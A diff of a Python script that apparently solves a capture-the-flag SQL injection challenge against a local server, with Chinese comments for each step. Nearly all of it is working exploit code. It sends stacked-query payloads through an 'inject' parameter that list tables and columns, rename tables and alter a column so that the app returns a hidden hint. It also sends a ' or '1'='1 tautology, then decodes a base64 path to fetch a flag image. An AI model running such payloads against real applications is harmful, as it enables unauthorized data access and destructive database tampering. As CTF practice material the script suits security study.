@@ -8,16 +8,16 @@ from PIL import Image
 
 rq=requests.Session()
 
-url = "http://127.0.0.1:8302"
+url = "http://127.0.0.1:8302/share.php"
 
 User_Agent='Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'
 
-result_1 = rq.get(url+r"/?inject=1';show tables;#")
+result_1 = rq.get(url+r"?inject=1';show tables;#")
 # 发现存有提示的表“f_here is tips”
 
 table_name = "f_here is tips"
 
-result_2 = rq.get(url+r"/?inject=';show columns from `f_here_is_tips`;#")
+result_2 = rq.get(url+r"?inject=';show columns from `f_here_is_tips`;#")
 # 查看列名:hints
 
 # print(result_2.text)
@@ -25,12 +25,12 @@ result_2 = rq.get(url+r"/?inject=';show columns from `f_here_is_tips`;#")
 column_name = "hints"
 
 result_3 = rq.get(url+
-r"/?inject=1';RENAME TABLE `come_on` TO `words1`;RENAME TABLE `f_here_is_tips` TO `come_on`;ALTER TABLE `come_on` CHANGE `hints` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from come_on;#")
+r"?inject=1';RENAME TABLE `come_on` TO `words1`;RENAME TABLE `f_here_is_tips` TO `come_on`;ALTER TABLE `come_on` CHANGE `hints` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from come_on;#")
 # 修改here is tips表为默认查询的表 修改列名flag 为id 即默认查询的列
 
 # print(result_3.text)
 
-result_4= rq.get(url+r"/?inject=1' or '1'='1")
+result_4= rq.get(url+r"?inject=1' or '1'='1")
 # 得到1串base64，这就是提示
 
 # print(result_4.text)
@@ -47,7 +47,7 @@ tips_str = repr(base64.b64decode(tips))
 tips_str = tips_str[2:-3]
 
 
-img_url = url + tips_str
+img_url = "http://127.0.0.1:8302" + tips_str
 
 file_name = 'flag.jpg'
 
